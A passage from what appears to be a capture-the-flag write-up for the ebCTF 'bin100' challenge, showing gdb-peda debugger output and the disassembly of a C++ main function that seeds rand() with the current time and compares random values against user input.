EDX: 0xffffb5b4 --&amp;gt; 0xf7e5a000 --&amp;gt; 0x1a9da8
ESI: 0x0
EDI: 0x0
EBP: 0x0
ESP: 0xffffb58c --&amp;gt; 0xf7cc9a83 (&amp;lt;__libc_start_main+243&amp;gt;:    mov    DWORD PTR [esp],eax)
EIP: 0x8048c4c (&amp;lt;main&amp;gt;: push   ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048c41 &amp;lt;frame_dummy+33&amp;gt;:  leave
   0x8048c42 &amp;lt;frame_dummy+34&amp;gt;:  jmp    0x8048bc0 &amp;lt;register_tm_clones&amp;gt;
   0x8048c47 &amp;lt;frame_dummy+39&amp;gt;:  jmp    0x8048bc0 &amp;lt;register_tm_clones&amp;gt;
=&amp;gt; 0x8048c4c &amp;lt;main&amp;gt;:    push   ebp
   0x8048c4d &amp;lt;main+1&amp;gt;:  mov    ebp,esp
   0x8048c4f &amp;lt;main+3&amp;gt;:  push   esi
   0x8048c50 &amp;lt;main+4&amp;gt;:  push   ebx
   0x8048c51 &amp;lt;main+5&amp;gt;:  and    esp,0xfffffff0
[------------------------------------stack-------------------------------------]
0000| 0xffffb58c --&amp;gt; 0xf7cc9a83 (&amp;lt;__libc_start_main+243&amp;gt;:   mov    DWORD PTR [esp],eax)
0004| 0xffffb590 --&amp;gt; 0x1
0008| 0xffffb594 --&amp;gt; 0xffffb624 --&amp;gt; 0xffffb82e (&#34;/media/shiv/red_third/stoolbox/challenges/ebctf/bin100/bin100&#34;)
0012| 0xffffb598 --&amp;gt; 0xffffb62c --&amp;gt; 0xffffb86c (&#34;GREP_COLOR=1;33&#34;)
0016| 0xffffb59c --&amp;gt; 0xf7feacea (add    ebx,0x12316)
0020| 0xffffb5a0 --&amp;gt; 0x1
0024| 0xffffb5a4 --&amp;gt; 0xffffb624 --&amp;gt; 0xffffb82e (&#34;/media/shiv/red_third/stoolbox/challenges/ebctf/bin100/bin100&#34;)
0028| 0xffffb5a8 --&amp;gt; 0xffffb5c4 --&amp;gt; 0xce293764
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048c4c in main ()
gdb-peda$  pdisas main
Dump of assembler code for function main:
=&amp;gt; 0x08048c4c &amp;lt;+0&amp;gt;: push   ebp
   0x08048c4d &amp;lt;+1&amp;gt;: mov    ebp,esp
   0x08048c4f &amp;lt;+3&amp;gt;: push   esi
   0x08048c50 &amp;lt;+4&amp;gt;: push   ebx
   0x08048c51 &amp;lt;+5&amp;gt;: and    esp,0xfffffff0
   0x08048c54 &amp;lt;+8&amp;gt;: sub    esp,0x70
   0x08048c57 &amp;lt;+11&amp;gt;:    lea    eax,[esp+0x3c]
   0x08048c5b &amp;lt;+15&amp;gt;:    mov    DWORD PTR [esp],eax
   0x08048c5e &amp;lt;+18&amp;gt;:    call   0x80489d0 &amp;lt;_ZNSsC1Ev@plt&amp;gt;
   0x08048c63 &amp;lt;+23&amp;gt;:    mov    DWORD PTR [esp+0x6c],0x5
   0x08048c6b &amp;lt;+31&amp;gt;:    lea    eax,[esp+0x38]
   0x08048c6f &amp;lt;+35&amp;gt;:    mov    DWORD PTR [esp],eax
   0x08048c72 &amp;lt;+38&amp;gt;:    call   0x80489d0 &amp;lt;_ZNSsC1Ev@plt&amp;gt;
   0x08048c77 &amp;lt;+43&amp;gt;:    lea    eax,[esp+0x34]
   0x08048c7b &amp;lt;+47&amp;gt;:    mov    DWORD PTR [esp],eax
   0x08048c7e &amp;lt;+50&amp;gt;:    call   0x80489d0 &amp;lt;_ZNSsC1Ev@plt&amp;gt;
   0x08048c83 &amp;lt;+55&amp;gt;:    mov    DWORD PTR [esp],0x0
   0x08048c8a &amp;lt;+62&amp;gt;:    call   0x8048ad0 &amp;lt;time@plt&amp;gt;
   0x08048c8f &amp;lt;+67&amp;gt;:    mov    DWORD PTR [esp],eax
   0x08048c92 &amp;lt;+70&amp;gt;:    call   0x80489e0 &amp;lt;srand@plt&amp;gt;
   0x08048c97 &amp;lt;+75&amp;gt;:    lea    eax,[esp+0x41]
   0x08048c9b &amp;lt;+79&amp;gt;:    mov    DWORD PTR [esp],eax
   0x08048c9e &amp;lt;+82&amp;gt;:    call   0x8048b30 &amp;lt;_ZNSaIcEC1Ev@plt&amp;gt;
   0x08048ca3 &amp;lt;+87&amp;gt;:    lea    eax,[esp+0x41]
   0x08048ca7 &amp;lt;+91&amp;gt;:    mov    DWORD PTR [esp+0x8],eax
   0x08048cab &amp;lt;+95&amp;gt;:    mov    DWORD PTR [esp+0x4],0x8049e40
   0x08048cb3 &amp;lt;+103&amp;gt;:   lea    eax,[esp+0x30]
   0x08048cb7 &amp;lt;+107&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048cba &amp;lt;+110&amp;gt;:   call   0x8048ac0 &amp;lt;_ZNSsC1EPKcRKSaIcE@plt&amp;gt;
   0x08048cbf &amp;lt;+115&amp;gt;:   lea    eax,[esp+0x41]
   0x08048cc3 &amp;lt;+119&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048cc6 &amp;lt;+122&amp;gt;:   call   0x8048af0 &amp;lt;_ZNSaIcED1Ev@plt&amp;gt;
   0x08048ccb &amp;lt;+127&amp;gt;:   lea    eax,[esp+0x42]
   0x08048ccf &amp;lt;+131&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048cd2 &amp;lt;+134&amp;gt;:   call   0x8048b30 &amp;lt;_ZNSaIcEC1Ev@plt&amp;gt;
   0x08048cd7 &amp;lt;+139&amp;gt;:   lea    eax,[esp+0x42]
   0x08048cdb &amp;lt;+143&amp;gt;:   mov    DWORD PTR [esp+0x8],eax
   0x08048cdf &amp;lt;+147&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8049e74
   0x08048ce7 &amp;lt;+155&amp;gt;:   lea    eax,[esp+0x2c]
   0x08048ceb &amp;lt;+159&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048cee &amp;lt;+162&amp;gt;:   call   0x8048ac0 &amp;lt;_ZNSsC1EPKcRKSaIcE@plt&amp;gt;
   0x08048cf3 &amp;lt;+167&amp;gt;:   lea    eax,[esp+0x42]
   0x08048cf7 &amp;lt;+171&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048cfa &amp;lt;+174&amp;gt;:   call   0x8048af0 &amp;lt;_ZNSaIcED1Ev@plt&amp;gt;
   0x08048cff &amp;lt;+179&amp;gt;:   lea    eax,[esp+0x43]
   0x08048d03 &amp;lt;+183&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048d06 &amp;lt;+186&amp;gt;:   call   0x8048b30 &amp;lt;_ZNSaIcEC1Ev@plt&amp;gt;
   0x08048d0b &amp;lt;+191&amp;gt;:   lea    eax,[esp+0x43]
   0x08048d0f &amp;lt;+195&amp;gt;:   mov    DWORD PTR [esp+0x8],eax
   0x08048d13 &amp;lt;+199&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8049ea8
   0x08048d1b &amp;lt;+207&amp;gt;:   lea    eax,[esp+0x28]
   0x08048d1f &amp;lt;+211&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048d22 &amp;lt;+214&amp;gt;:   call   0x8048ac0 &amp;lt;_ZNSsC1EPKcRKSaIcE@plt&amp;gt;
   0x08048d27 &amp;lt;+219&amp;gt;:   lea    eax,[esp+0x43]
   0x08048d2b &amp;lt;+223&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048d2e &amp;lt;+226&amp;gt;:   call   0x8048af0 &amp;lt;_ZNSaIcED1Ev@plt&amp;gt;
   0x08048d33 &amp;lt;+231&amp;gt;:   lea    eax,[esp+0x44]
   0x08048d37 &amp;lt;+235&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048d3a &amp;lt;+238&amp;gt;:   call   0x8048b30 &amp;lt;_ZNSaIcEC1Ev@plt&amp;gt;
   0x08048d3f &amp;lt;+243&amp;gt;:   lea    eax,[esp+0x44]
   0x08048d43 &amp;lt;+247&amp;gt;:   mov    DWORD PTR [esp+0x8],eax
   0x08048d47 &amp;lt;+251&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8049edc
   0x08048d4f &amp;lt;+259&amp;gt;:   lea    eax,[esp+0x24]
   0x08048d53 &amp;lt;+263&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048d56 &amp;lt;+266&amp;gt;:   call   0x8048ac0 &amp;lt;_ZNSsC1EPKcRKSaIcE@plt&amp;gt;
   0x08048d5b &amp;lt;+271&amp;gt;:   lea    eax,[esp+0x44]
   0x08048d5f &amp;lt;+275&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048d62 &amp;lt;+278&amp;gt;:   call   0x8048af0 &amp;lt;_ZNSaIcED1Ev@plt&amp;gt;
   0x08048d67 &amp;lt;+283&amp;gt;:   lea    eax,[esp+0x45]
   0x08048d6b &amp;lt;+287&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048d6e &amp;lt;+290&amp;gt;:   call   0x8048b30 &amp;lt;_ZNSaIcEC1Ev@plt&amp;gt;
   0x08048d73 &amp;lt;+295&amp;gt;:   lea    eax,[esp+0x45]
   0x08048d77 &amp;lt;+299&amp;gt;:   mov    DWORD PTR [esp+0x8],eax
   0x08048d7b &amp;lt;+303&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8049f10
   0x08048d83 &amp;lt;+311&amp;gt;:   lea    eax,[esp+0x20]
   0x08048d87 &amp;lt;+315&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048d8a &amp;lt;+318&amp;gt;:   call   0x8048ac0 &amp;lt;_ZNSsC1EPKcRKSaIcE@plt&amp;gt;
   0x08048d8f &amp;lt;+323&amp;gt;:   lea    eax,[esp+0x45]
   0x08048d93 &amp;lt;+327&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048d96 &amp;lt;+330&amp;gt;:   call   0x8048af0 &amp;lt;_ZNSaIcED1Ev@plt&amp;gt;
   0x08048d9b &amp;lt;+335&amp;gt;:   lea    eax,[esp+0x46]
   0x08048d9f &amp;lt;+339&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048da2 &amp;lt;+342&amp;gt;:   call   0x8048b30 &amp;lt;_ZNSaIcEC1Ev@plt&amp;gt;
   0x08048da7 &amp;lt;+347&amp;gt;:   lea    eax,[esp+0x46]
   0x08048dab &amp;lt;+351&amp;gt;:   mov    DWORD PTR [esp+0x8],eax
   0x08048daf &amp;lt;+355&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8049f44
   0x08048db7 &amp;lt;+363&amp;gt;:   lea    eax,[esp+0x1c]
   0x08048dbb &amp;lt;+367&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048dbe &amp;lt;+370&amp;gt;:   call   0x8048ac0 &amp;lt;_ZNSsC1EPKcRKSaIcE@plt&amp;gt;
   0x08048dc3 &amp;lt;+375&amp;gt;:   lea    eax,[esp+0x46]
   0x08048dc7 &amp;lt;+379&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048dca &amp;lt;+382&amp;gt;:   call   0x8048af0 &amp;lt;_ZNSaIcED1Ev@plt&amp;gt;
   0x08048dcf &amp;lt;+387&amp;gt;:   lea    eax,[esp+0x47]
   0x08048dd3 &amp;lt;+391&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048dd6 &amp;lt;+394&amp;gt;:   call   0x8048b30 &amp;lt;_ZNSaIcEC1Ev@plt&amp;gt;
   0x08048ddb &amp;lt;+399&amp;gt;:   lea    eax,[esp+0x47]
   0x08048ddf &amp;lt;+403&amp;gt;:   mov    DWORD PTR [esp+0x8],eax
   0x08048de3 &amp;lt;+407&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8049f78
   0x08048deb &amp;lt;+415&amp;gt;:   lea    eax,[esp+0x18]
   0x08048def &amp;lt;+419&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048df2 &amp;lt;+422&amp;gt;:   call   0x8048ac0 &amp;lt;_ZNSsC1EPKcRKSaIcE@plt&amp;gt;
   0x08048df7 &amp;lt;+427&amp;gt;:   lea    eax,[esp+0x47]
   0x08048dfb &amp;lt;+431&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048dfe &amp;lt;+434&amp;gt;:   call   0x8048af0 &amp;lt;_ZNSaIcED1Ev@plt&amp;gt;
   0x08048e03 &amp;lt;+439&amp;gt;:   mov    DWORD PTR [esp+0x58],0x66
   0x08048e0b &amp;lt;+447&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8048b20
   0x08048e13 &amp;lt;+455&amp;gt;:   mov    DWORD PTR [esp],0x804b780
   0x08048e1a &amp;lt;+462&amp;gt;:   call   0x8048b00 &amp;lt;_ZNSolsEPFRSoS_E@plt&amp;gt;
   0x08048e1f &amp;lt;+467&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8049fac
   0x08048e27 &amp;lt;+475&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048e2a &amp;lt;+478&amp;gt;:   call   0x8048aa0 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&amp;gt;
   0x08048e2f &amp;lt;+483&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8048b20
   0x08048e37 &amp;lt;+491&amp;gt;:   mov    DWORD PTR [esp],0x804b780
   0x08048e3e &amp;lt;+498&amp;gt;:   call   0x8048b00 &amp;lt;_ZNSolsEPFRSoS_E@plt&amp;gt;
   0x08048e43 &amp;lt;+503&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8049fd0
   0x08048e4b &amp;lt;+511&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048e4e &amp;lt;+514&amp;gt;:   call   0x8048aa0 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&amp;gt;
   0x08048e53 &amp;lt;+519&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8048b20
   0x08048e5b &amp;lt;+527&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048e5e &amp;lt;+530&amp;gt;:   call   0x8048b00 &amp;lt;_ZNSolsEPFRSoS_E@plt&amp;gt;
   0x08048e63 &amp;lt;+535&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8048b20
   0x08048e6b &amp;lt;+543&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048e6e &amp;lt;+546&amp;gt;:   call   0x8048b00 &amp;lt;_ZNSolsEPFRSoS_E@plt&amp;gt;
   0x08048e73 &amp;lt;+551&amp;gt;:   mov    DWORD PTR [esp+0x4],0x804a010
   0x08048e7b &amp;lt;+559&amp;gt;:   mov    DWORD PTR [esp],0x804b780
   0x08048e82 &amp;lt;+566&amp;gt;:   call   0x8048aa0 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&amp;gt;
   0x08048e87 &amp;lt;+571&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8048b20
   0x08048e8f &amp;lt;+579&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048e92 &amp;lt;+582&amp;gt;:   call   0x8048b00 &amp;lt;_ZNSolsEPFRSoS_E@plt&amp;gt;
   0x08048e97 &amp;lt;+587&amp;gt;:   lea    eax,[esp+0x34]
   0x08048e9b &amp;lt;+591&amp;gt;:   mov    DWORD PTR [esp+0x4],eax
   0x08048e9f &amp;lt;+595&amp;gt;:   mov    DWORD PTR [esp],0x804b6e0
   0x08048ea6 &amp;lt;+602&amp;gt;:   call   0x8048a10 &amp;lt;_ZSt7getlineIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RSbIS4_S5_T1_E@plt&amp;gt;
   0x08048eab &amp;lt;+607&amp;gt;:   mov    DWORD PTR [esp],0x0
   0x08048eb2 &amp;lt;+614&amp;gt;:   call   0x8048ad0 &amp;lt;time@plt&amp;gt;
   0x08048eb7 &amp;lt;+619&amp;gt;:   mov    DWORD PTR [esp+0x54],eax
   0x08048ebb &amp;lt;+623&amp;gt;:   call   0x8048b10 &amp;lt;rand@plt&amp;gt;
   0x08048ec0 &amp;lt;+628&amp;gt;:   mov    ecx,eax
   0x08048ec2 &amp;lt;+630&amp;gt;:   mov    edx,0x2aaaaaab
   0x08048ec7 &amp;lt;+635&amp;gt;:   mov    eax,ecx
   0x08048ec9 &amp;lt;+637&amp;gt;:   imul   edx
   0x08048ecb &amp;lt;+639&amp;gt;:   mov    eax,ecx
   0x08048ecd &amp;lt;+641&amp;gt;:   sar    eax,0x1f
   0x08048ed0 &amp;lt;+644&amp;gt;:   sub    edx,eax
   0x08048ed2 &amp;lt;+646&amp;gt;:   mov    eax,edx
   0x08048ed4 &amp;lt;+648&amp;gt;:   add    eax,eax
   0x08048ed6 &amp;lt;+650&amp;gt;:   add    eax,edx
   0x08048ed8 &amp;lt;+652&amp;gt;:   add    eax,eax
   0x08048eda &amp;lt;+654&amp;gt;:   mov    edx,ecx
   0x08048edc &amp;lt;+656&amp;gt;:   sub    edx,eax
   0x08048ede &amp;lt;+658&amp;gt;:   lea    eax,[edx+0x1]
&amp;lt;snip&amp;gt;
   0x08049d39 &amp;lt;+4333&amp;gt;:  mov    eax,ebx
   0x08049d3b &amp;lt;+4335&amp;gt;:  jmp    0x8049d3d &amp;lt;main+4337&amp;gt;
   0x08049d3d &amp;lt;+4337&amp;gt;:  mov    DWORD PTR [esp],eax
   0x08049d40 &amp;lt;+4340&amp;gt;:  call   0x8048b50 &amp;lt;_Unwind_Resume@plt&amp;gt;
   0x08049d45 &amp;lt;+4345&amp;gt;:  lea    esp,[ebp-0x8]
   0x08049d48 &amp;lt;+4348&amp;gt;:  pop    ebx
   0x08049d49 &amp;lt;+4349&amp;gt;:  pop    esi
   0x08049d4a &amp;lt;+4350&amp;gt;:  pop    ebp
   0x08049d4b &amp;lt;+4351&amp;gt;:  ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Analyzing this function is quite easy if you note the following block being repeated five times:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   0x08048ee1 &amp;lt;+661&amp;gt;:   mov    DWORD PTR [esp+0x50],eax
   0x08048ee5 &amp;lt;+665&amp;gt;:   cmp    DWORD PTR [esp+0x50],0x1
   0x08048eea &amp;lt;+670&amp;gt;:   jne    0x8048f00 &amp;lt;main+692&amp;gt;
   0x08048eec &amp;lt;+672&amp;gt;:   lea    eax,[esp+0x30]
   0x08048ef0 &amp;lt;+676&amp;gt;:   mov    DWORD PTR [esp+0x4],eax
   0x08048ef4 &amp;lt;+680&amp;gt;:   mov    DWORD PTR [esp],0x804b780
   0x08048efb &amp;lt;+687&amp;gt;:   call   0x8048ae0 &amp;lt;_ZStlsIcSt11char_traitsIcESaIcEERSt13basic_ostreamIT_T0_ES7_RKSbIS4_S5_T1_E@plt&amp;gt;
   0x08048f00 &amp;lt;+692&amp;gt;:   cmp    DWORD PTR [esp+0x50],0x2
   0x08048f05 &amp;lt;+697&amp;gt;:   jne    0x8048f1b &amp;lt;main+719&amp;gt;
   0x08048f07 &amp;lt;+699&amp;gt;:   lea    eax,[esp+0x2c]
   0x08048f0b &amp;lt;+703&amp;gt;:   mov    DWORD PTR [esp+0x4],eax
   0x08048f0f &amp;lt;+707&amp;gt;:   mov    DWORD PTR [esp],0x804b780
   0x08048f16 &amp;lt;+714&amp;gt;:   call   0x8048ae0 &amp;lt;_ZStlsIcSt11char_traitsIcESaIcEERSt13basic_ostreamIT_T0_ES7_RKSbIS4_S5_T1_E@plt&amp;gt;
   0x08048f1b &amp;lt;+719&amp;gt;:   cmp    DWORD PTR [esp+0x50],0x3
   0x08048f20 &amp;lt;+724&amp;gt;:   jne    0x8048f36 &amp;lt;main+746&amp;gt;
   0x08048f22 &amp;lt;+726&amp;gt;:   lea    eax,[esp+0x28]
   0x08048f26 &amp;lt;+730&amp;gt;:   mov    DWORD PTR [esp+0x4],eax
   0x08048f2a &amp;lt;+734&amp;gt;:   mov    DWORD PTR [esp],0x804b780
   0x08048f31 &amp;lt;+741&amp;gt;:   call   0x8048ae0 &amp;lt;_ZStlsIcSt11char_traitsIcESaIcEERSt13basic_ostreamIT_T0_ES7_RKSbIS4_S5_T1_E@plt&amp;gt;
   0x08048f36 &amp;lt;+746&amp;gt;:   cmp    DWORD PTR [esp+0x50],0x4
   0x08048f3b &amp;lt;+751&amp;gt;:   jne    0x8048f51 &amp;lt;main+773&amp;gt;
   0x08048f3d &amp;lt;+753&amp;gt;:   lea    eax,[esp+0x24]
   0x08048f41 &amp;lt;+757&amp;gt;:   mov    DWORD PTR [esp+0x4],eax
   0x08048f45 &amp;lt;+761&amp;gt;:   mov    DWORD PTR [esp],0x804b780
   0x08048f4c &amp;lt;+768&amp;gt;:   call   0x8048ae0 &amp;lt;_ZStlsIcSt11char_traitsIcESaIcEERSt13basic_ostreamIT_T0_ES7_RKSbIS4_S5_T1_E@plt&amp;gt;
   0x08048f51 &amp;lt;+773&amp;gt;:   cmp    DWORD PTR [esp+0x50],0x5
   0x08048f56 &amp;lt;+778&amp;gt;:   jne    0x8048f6c &amp;lt;main+800&amp;gt;
   0x08048f58 &amp;lt;+780&amp;gt;:   lea    eax,[esp+0x20]
   0x08048f5c &amp;lt;+784&amp;gt;:   mov    DWORD PTR [esp+0x4],eax
   0x08048f60 &amp;lt;+788&amp;gt;:   mov    DWORD PTR [esp],0x804b780
   0x08048f67 &amp;lt;+795&amp;gt;:   call   0x8048ae0 &amp;lt;_ZStlsIcSt11char_traitsIcESaIcEERSt13basic_ostreamIT_T0_ES7_RKSbIS4_S5_T1_E@plt&amp;gt;
   0x08048f6c &amp;lt;+800&amp;gt;:   cmp    DWORD PTR [esp+0x50],0x6
   0x08048f71 &amp;lt;+805&amp;gt;:   jne    0x8048f87 &amp;lt;main+827&amp;gt;
   0x08048f73 &amp;lt;+807&amp;gt;:   lea    eax,[esp+0x1c]
   0x08048f77 &amp;lt;+811&amp;gt;:   mov    DWORD PTR [esp+0x4],eax
   0x08048f7b &amp;lt;+815&amp;gt;:   mov    DWORD PTR [esp],0x804b780
   0x08048f82 &amp;lt;+822&amp;gt;:   call   0x8048ae0 &amp;lt;_ZStlsIcSt11char_traitsIcESaIcEERSt13basic_ostreamIT_T0_ES7_RKSbIS4_S5_T1_E@plt&amp;gt;
   0x08048f87 &amp;lt;+827&amp;gt;:   cmp    DWORD PTR [esp+0x50],0x3
   0x08048f8c &amp;lt;+832&amp;gt;:   jne    0x8048fdc &amp;lt;main+912&amp;gt;
   0x08048f8e &amp;lt;+834&amp;gt;:   mov    DWORD PTR [esp+0x4],0x804a057
   0x08048f96 &amp;lt;+842&amp;gt;:   mov    DWORD PTR [esp],0x804b780
   0x08048f9d &amp;lt;+849&amp;gt;:   call   0x8048aa0 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&amp;gt;
   0x08048fa2 &amp;lt;+854&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8048b20
   0x08048faa &amp;lt;+862&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048fad &amp;lt;+865&amp;gt;:   call   0x8048b00 &amp;lt;_ZNSolsEPFRSoS_E@plt&amp;gt;
   0x08048fb2 &amp;lt;+870&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8048b20
   0x08048fba &amp;lt;+878&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048fbd &amp;lt;+881&amp;gt;:   call   0x8048b00 &amp;lt;_ZNSolsEPFRSoS_E@plt&amp;gt;
   0x08048fc2 &amp;lt;+886&amp;gt;:   shl    DWORD PTR [esp+0x6c],1
   0x08048fc6 &amp;lt;+890&amp;gt;:   mov    DWORD PTR [esp+0x4],0x804a078
   0x08048fce &amp;lt;+898&amp;gt;:   lea    eax,[esp+0x38]
   0x08048fd2 &amp;lt;+902&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048fd5 &amp;lt;+905&amp;gt;:   call   0x80489c0 &amp;lt;_ZNSsaSEPKc@plt&amp;gt;
   0x08048fda &amp;lt;+910&amp;gt;:   jmp    0x8049053 &amp;lt;main+1031&amp;gt;
   0x08048fdc &amp;lt;+912&amp;gt;:   mov    DWORD PTR [esp+0x4],0x804a0a0
   0x08048fe4 &amp;lt;+920&amp;gt;:   mov    DWORD PTR [esp],0x804b780
   0x08048feb &amp;lt;+927&amp;gt;:   call   0x8048aa0 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&amp;gt;
   0x08048ff0 &amp;lt;+932&amp;gt;:   mov    edx,DWORD PTR [esp+0x50]
   0x08048ff4 &amp;lt;+936&amp;gt;:   mov    DWORD PTR [esp+0x4],edx
   0x08048ff8 &amp;lt;+940&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048ffb &amp;lt;+943&amp;gt;:   call   0x80489f0 &amp;lt;_ZNSolsEi@plt&amp;gt;
   0x08049000 &amp;lt;+948&amp;gt;:   mov    DWORD PTR [esp+0x4],0x804a0b2
   0x08049008 &amp;lt;+956&amp;gt;:   mov    DWORD PTR [esp],eax
   0x0804900b &amp;lt;+959&amp;gt;:   call   0x8048aa0 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&amp;gt;
   0x08049010 &amp;lt;+964&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8048b20
   0x08049018 &amp;lt;+972&amp;gt;:   mov    DWORD PTR [esp],eax
   0x0804901b &amp;lt;+975&amp;gt;:   call   0x8048b00 &amp;lt;_ZNSolsEPFRSoS_E@plt&amp;gt;
   0x08049020 &amp;lt;+980&amp;gt;:   mov    DWORD PTR [esp+0x4],0x804a0ca
   0x08049028 &amp;lt;+988&amp;gt;:   mov    DWORD PTR [esp],0x804b780
   0x0804902f &amp;lt;+995&amp;gt;:   call   0x8048aa0 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&amp;gt;
   0x08049034 &amp;lt;+1000&amp;gt;:  mov    DWORD PTR [esp+0x4],0x8048b20
   0x0804903c &amp;lt;+1008&amp;gt;:  mov    DWORD PTR [esp],eax
   0x0804903f &amp;lt;+1011&amp;gt;:  call   0x8048b00 &amp;lt;_ZNSolsEPFRSoS_E@plt&amp;gt;
   0x08049044 &amp;lt;+1016&amp;gt;:  mov    ebx,0x0
   0x08049049 &amp;lt;+1021&amp;gt;:  mov    esi,0x0
   0x0804904e &amp;lt;+1026&amp;gt;:  jmp    0x8049b00 &amp;lt;main+3764&amp;gt;
   0x08049053 &amp;lt;+1031&amp;gt;:  mov    DWORD PTR [esp],0x0
   0x0804905a &amp;lt;+1038&amp;gt;:  call   0x8048ad0 &amp;lt;time@plt&amp;gt;
   0x0804905f &amp;lt;+1043&amp;gt;:  mov    DWORD PTR [esp+0x4c],eax
   0x08049063 &amp;lt;+1047&amp;gt;:  mov    eax,DWORD PTR [esp+0x54]
   0x08049067 &amp;lt;+1051&amp;gt;:  mov    edx,DWORD PTR [esp+0x4c]
   0x0804906b &amp;lt;+1055&amp;gt;:  mov    ecx,edx
   0x0804906d &amp;lt;+1057&amp;gt;:  sub    ecx,eax
   0x0804906f &amp;lt;+1059&amp;gt;:  mov    eax,ecx
   0x08049071 &amp;lt;+1061&amp;gt;:  mov    DWORD PTR [esp+0x48],eax
   0x08049075 &amp;lt;+1065&amp;gt;:  cmp    DWORD PTR [esp+0x48],0x2
   0x0804907a &amp;lt;+1070&amp;gt;:  jle    0x8049080 &amp;lt;main+1076&amp;gt;
   0x0804907c &amp;lt;+1072&amp;gt;:  shl    DWORD PTR [esp+0x6c],1
   0x08049080 &amp;lt;+1076&amp;gt;:  mov    DWORD PTR [esp+0x4],0x804a0dc
   0x08049088 &amp;lt;+1084&amp;gt;:  mov    DWORD PTR [esp],0x804b780
   0x0804908f &amp;lt;+1091&amp;gt;:  call   0x8048aa0 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&amp;gt;
   0x08049094 &amp;lt;+1096&amp;gt;:  mov    DWORD PTR [esp+0x4],0x8048b20
   0x0804909c &amp;lt;+1104&amp;gt;:  mov    DWORD PTR [esp],eax
   0x0804909f &amp;lt;+1107&amp;gt;:  call   0x8048b00 &amp;lt;_ZNSolsEPFRSoS_E@plt&amp;gt;
   0x080490a4 &amp;lt;+1112&amp;gt;:  lea    eax,[esp+0x34]
   0x080490a8 &amp;lt;+1116&amp;gt;:  mov    DWORD PTR [esp+0x4],eax
   0x080490ac &amp;lt;+1120&amp;gt;:  mov    DWORD PTR [esp],0x804b6e0
   0x080490b3 &amp;lt;+1127&amp;gt;:  call   0x8048a10 &amp;lt;_ZSt7getlineIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RSbIS4_S5_T1_E@plt&amp;gt;
   0x080490b8 &amp;lt;+1132&amp;gt;:  mov    DWORD PTR [esp],0x0
   0x080490bf &amp;lt;+1139&amp;gt;:  call   0x8048ad0 &amp;lt;time@plt&amp;gt;
   0x080490c4 &amp;lt;+1144&amp;gt;:  mov    DWORD PTR [esp+0x54],eax
   0x080490c8 &amp;lt;+1148&amp;gt;:  call   0x8048b10 &amp;lt;rand@plt&amp;gt;
   0x080490cd &amp;lt;+1153&amp;gt;:  mov    ecx,eax
   0x080490cf &amp;lt;+1155&amp;gt;:  mov    edx,0x2aaaaaab
   0x080490d4 &amp;lt;+1160&amp;gt;:  mov    eax,ecx
   0x080490d6 &amp;lt;+1162&amp;gt;:  imul   edx
   0x080490d8 &amp;lt;+1164&amp;gt;:  mov    eax,ecx
   0x080490da &amp;lt;+1166&amp;gt;:  sar    eax,0x1f
